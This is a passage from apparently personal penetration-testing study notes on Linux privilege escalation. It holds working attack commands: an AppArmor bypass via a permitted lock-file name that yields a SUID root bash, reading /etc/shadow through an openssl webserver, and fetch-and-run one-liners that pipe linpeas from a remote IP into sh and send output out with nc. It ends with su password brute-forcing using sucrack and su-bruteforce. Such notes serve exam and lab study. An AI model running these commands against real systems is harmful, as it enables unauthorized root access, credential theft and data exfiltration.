“*ruby2.5*” 2&gt;/dev/null</em></p><p></p><p><strong>/etc/apparmor.d/cache/usr.bin.ruby2.5</strong><strong></strong></p><p><strong>/etc/apparmor.d/usr.bin.ruby2.5</strong>				(Check this one!)</p><p></p><p><span class="subheading">Check Logs</span>: Syslog may show whether or not AppArmor blocked a cmd.</p><p></p><p><em>cat /var/log/syslog | grep ruby2.5</em></p><p>...</p><p><strong>apparmor=&quot;DENIED&quot;</strong></p><p></p><p><h2>Examine Target AppArmor File</h2></p><p><em>cat /etc/apparmor.d/usr.bin.ruby2.5</em></p><p></p><p><strong>capability setuid,</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>deny /etc/shadow rwx,</strong></p><p>...</p><p><strong>/usr/bin/whoami mrix,</strong><strong></strong></p><p><strong>/bin/cp mrix,</strong><strong></strong></p><p><strong>/etc/passwd r,</strong><strong></strong></p><p><strong>/tmp/.X[0-9]*-lock rw,</strong></p><p>...</p><p></p><p><h3>Understanding File&#39;s Restrictions</h3></p><p>This has Allow &amp; Deny rules for actions performed using the binary&#39;s the setuid capability.</p><p></p><p>Deny rules blacklist certain actions &amp; allow rules, which act as a whitelist for certain actions. If something isn&#39;t covered by an Allow rule, it cannot be done.</p><p></p><p><span class="subheading">Deny Rule</span>: This shows that access to <strong>/etc/shadow</strong> is completely denied. You can&#39;t R/W/X.</p><p><strong>deny /etc/shadow rwx</strong></p><p></p><p><span class="subheading">Allow Rule</span>: This shows that <strong>/usr/bin/whoami </strong> &amp; <strong>/bin/cp</strong> have perms for Map, Read, &amp; Inherit-Execute.</p><p></p><p><strong>/usr/bin/whoami mrix,</strong><strong></strong></p><p><strong>/bin/cp mrix</strong></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Regex</span>: <strong>/tmp/.X[0-9]*-lock rw</strong> means that you have R/W for any file that&#39;s named according to this Regex. For example, <strong>/tmp/.X2_blah-lock</strong>.</p><p></p><p><h2>Bypassing Restrictions</h2></p><p>In this case, you can create files that are named according to the aforementioned Regex &amp; use that file for PrivEsc.</p><p></p><p><h3>Setup</h3></p><p><strong>chmod +s FILE</strong> means that if someone else runs the file, they&#39;ll run it as the user who created it. It sets both UID &amp; GID Bits, see <a href="PrivEsc--Linux--SysAdmin_Stuff_43.html#Permissions">Permissions</a>.</p><p></p><p><em>cp /bin/bash /tmp/.X5-lock</em></p><p></p><p>chmod +s /tmp/.X5-lock</p><p></p><p><h3>Weaponize</h3></p><p><strong>cp --preserve=</strong> preserves the specified attribute in the copied file (i.e. <strong>mode</strong> will preserve the changes made with <strong>chmod +s</strong>).</p><p></p><p><em>/usr/bin/ruby2.5 -e ‘Process::Sys.setuid(0); exec “/bin/cp --preserve=mode /tmp/.X5-lock /tmp/.X6-lock”’</em></p><p></p><p><h3>Exploit</h3></p><p>You now effectively have SUID set on /bin/bash, &amp; can spawn a root shell by using the <strong>-p</strong> argument. (<em>ls -la</em> <em>/tmp/.X6-lock</em> <strong>-rwsr-sr-x 1 root alvin /tmp/.X6-lock</strong>).</p><p></p><p><em>/tmp/.X6-lock -p</em></p><p></p><p><h1>Freestyle Exploitation</h1></p><p>[OSCP 196]</p><p>Even if a binary doesn&#39;t have any documented PrivEsc methods, you may still be able to abuse it by understanding how it works. For ex,</p><p></p><p>If you can run openssl with elevated privs, you can use it to run a webserver at <strong>/</strong>. The elevated privs give you R/ access to files that&#39;re only acessible to root. You could then run-</p><p></p><p><em>curl -k https://localhost:1337/etc/shadow</em></p><p></p><p><h1>Linpeas</h1></p><p><span style="color:#ff0000;">Sometimes can&#39;t pipe</span> output to Attacker “Broken Pipe Error.” Confirm that FW isn&#39;t blocking that port.</p><p></p><p>★<span style="color:#f66151;text-decoration:underline;">WARNING</span>★: As an auto tool, sometimes <span style="color:#ff0000;">misses things</span> (e.g <strong>Hashes Inside Files</strong>). Not a replacement for manual enum. For ex-</p><p></p><p>Search for sensitive files which could contain creds / hashes (e.g <strong>password.php</strong>)</p><p></p><p><h2>Full Scan</h2></p><p><em>./linpeas.sh -a | nc ATKER 9999</em></p><p></p><p><h2>Run in Memory</h2></p><p>I don&#39;t think you can specify Linpeas args if you run it in RAM unless you get creative.</p><p></p><p><em>wget http://10.2.10.249/linpeas.sh -O - | sh | nc 10.2.10.249 9999</em><em></em></p><p><em></em><em></em></p><p><em>curl http://10.2.10.249/linpeas.sh | sh | nc 10.2.10.249 9999</em></p><p></p><p><h2>Specify Password</h2></p><p>Linpeas will attempt a basic BF against all detected users if you use the <strong>-a</strong> arg. You can combine it with <strong>-P</strong> to specify another password to try for sudo -l / su.</p><p></p><p><em>./linpeas -a -P password123 | nc 10.2.10.249 9999</em></p><p></p><p><h1>su Brute Forcing (For the Desperate)</h1></p><p>[<a href="PrivEsc_8.html">PrivEsc</a> 7, CTF D 15-17]</p><p></p><p>These tools work VERY SLOWLY &amp; run locally on target.</p><p></p><p>Due to the BF speed, these tools are better for testing a list of passwords (possibly with mutations) that you&#39;ve obtained from the engagement, rather than HUGE wordlists (i.e. rockyou.txt).</p><p></p><p><h2>sucrack</h2></p><p>You can download sucrack using your package manager (e.g. for Kali &amp; BlackArch), but this binary may not run on the target that you upload it to. You can instead try compiling <a href="https://github.com/hemp3l/sucrack">this Repo</a> on the target machine (See <a href="Exploit_Research--Compiling_Code_32.html#Compilation Troubleshooting">Compilation Troubleshooting</a>).</p><p></p><p>You may also be able to statically compile it on your machine by configuring sucrack with the <strong>--enable-static-linked</strong> flag. The default is a dynamicly linked sucrack (compiled with <strong>./configure </strong>&amp; then <strong>make</strong>).</p><p></p><p><em>./sucrack -u anita passwords.txt</em></p><p></p><p><em>./src/sucrack -w 100 -u hakanbey list.txt</em></p><p></p><p><h2>su-bruteforce</h2></p><p>Specify the user with <strong>-u</strong> &amp; the wordlist with <strong>-w</strong>. If you aren&#39;t changing the values for timeout or sleep, an example command is as follows.</p><p></p><p><span style="color:#f66151;text-decoration:underline;">WARNING</span>: May not be reliable (see below).</p><p></p><p><em>./suBF.sh -u hakanbey -w new-wordlist.txt</em></p><p></p><p><h3>Background</h3></p><p><a href="https://github.com/carlospolop/su-bruteforce/tree/master">su-bruteforce</a> is a simple shell script, so unlike sucrack, no compilation is needed. </p><p></p><p><span class="subheading">Speed</span>: Typically scripts that aren&#39;t compiled (i.e. bash) will run slower than compiled binaries, but that may not matter here.</p><p></p><p>I believe that the main limiting factors for the speed of su bruteforcing are dependent on the host&#39;s capabilities, rather than the script execution speed. These limiting factors include the following.</p><p><ol><li><strong>Concurrent Processes</strong>: It uses 100 instances of <strong>su</strong> at a time. I don&#39;t think this script lets you change that value.</li></ol></p><p><ol><li><strong>Timeout</strong>: How long does the host take to handle each attempt? You can control this with <strong>-t</strong> (0.7 by def). Decreasing this may lower reliablitiy &amp; increase load on system (0.5 is minimum accepted value). May need to increase it.</li></ol></p><p><ol><li><strong>Time Between Attempts</strong>: You can configure the “sleep” time between attempts with <strong>-s</strong> (0.007 by def). You may also need to increase this (the minimum accepted value is 0.003).</li></ol></p><p></p><p><h3>Troubleshooting</h3></p><p><strong>./suBF.sh: line 36: echo: Write error: Broken Pipe</strong></p><p></p><p>See <a href="Appendix--Code--Shell_(Bash)_84.html#Broken pipe">Broken pipe</a> troubleshooting. This error may indicate that this script is unreliable. It may not stop after a valid password is found &amp; it may not output the valid password. Multiple potential causes / fixes.</p><p></p><p></p><p></p></div>
</body>
</html>
